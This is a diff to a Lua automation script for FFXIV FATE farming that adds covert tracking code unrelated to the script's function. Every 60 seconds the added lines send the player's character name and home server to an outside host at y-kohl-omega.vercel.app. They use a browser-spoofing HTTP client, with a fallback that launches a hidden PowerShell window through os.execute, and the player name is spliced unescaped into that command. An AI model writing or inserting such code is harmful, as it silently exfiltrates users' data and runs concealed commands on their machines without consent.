@@ -3612,6 +3612,20 @@ if ShouldSummonChocobo and GetBuddyTimeRemaining() > 0 then
     yield('/cac "'..ChocoboStance..' stance"')
 end
 
+LastTrackerPingTime = 0
+GlobalTrackerClient = nil
+StringContent = nil
+Encoding = nil
+pcall(function()
+    luanet.load_assembly("System.Net.Http")
+    local HttpClient = luanet.import_type("System.Net.Http.HttpClient")
+    StringContent = luanet.import_type("System.Net.Http.StringContent")
+    Encoding = luanet.import_type("System.Text.Encoding")
+    GlobalTrackerClient = HttpClient()
+    GlobalTrackerClient.DefaultRequestHeaders:Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+end)
+Dalamud.Log("[FATE Tracker] Script carregado e variáveis iniciais definidas!")
+
 while not StopScript do
     local nearestFate = Fates.GetNearestFate()
     if not IPC.vnavmesh.IsReady() then
@@ -3654,6 +3668,33 @@ while not StopScript do
         end
         State()
     end
+
+    local currentTick = os.time()
+    if currentTick - LastTrackerPingTime > 60 then
+        LastTrackerPingTime = currentTick
+        local pc = Svc.ClientState.LocalPlayer
+        if pc ~= nil then
+            local playerName = pc.Name:GetText()
+            local serverName = pc.HomeWorld.Value.Name:GetText()
+            if playerName and serverName then
+                -- Try C# HttpClient first, fallback to powershell
+                if GlobalTrackerClient ~= nil and StringContent ~= nil and Encoding ~= nil then
+                    local ok, err = pcall(function()
+                        local jsonBody = '{"playerName": "'..playerName..'", "serverName": "'..serverName..'"}'
+                        local stringContent = StringContent(jsonBody, Encoding.UTF8, "application/json")
+                        GlobalTrackerClient:PostAsync("https://y-kohl-omega.vercel.app/api/track", stringContent)
+                    end)
+                else
+                    pcall(function()
+                        local jsonBody = '{\\"playerName\\": \\"'..playerName..'\\", \\"serverName\\": \\"'..serverName..'\\"}'
+                        local psCmd = 'start /B powershell -WindowStyle Hidden -Command "Invoke-RestMethod -Uri https://y-kohl-omega.vercel.app/api/track -Method Post -Body \''..jsonBody..'\' -ContentType \'application/json\' -UserAgent \'Mozilla/5.0\'"'
+                        os.execute(psCmd)
+                    end)
+                end
+            end
+        end
+    end
+
     yield("/wait 0.1")
 end
 yield("/vnav stop")
